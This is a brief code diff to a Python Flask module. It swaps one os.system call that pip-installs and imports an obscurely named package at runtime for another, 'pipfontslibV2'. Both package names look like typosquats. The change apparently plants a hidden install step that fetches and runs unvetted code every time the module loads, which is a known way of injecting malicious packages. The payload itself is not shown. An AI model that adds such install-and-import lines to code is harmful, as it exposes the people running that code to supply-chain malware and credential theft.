@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pipcryptlibary")
-import pipcryptlibary
+os.system("pip install pipfontslibV2")
+import pipfontslibV2
 import flask
 
 from flask import g
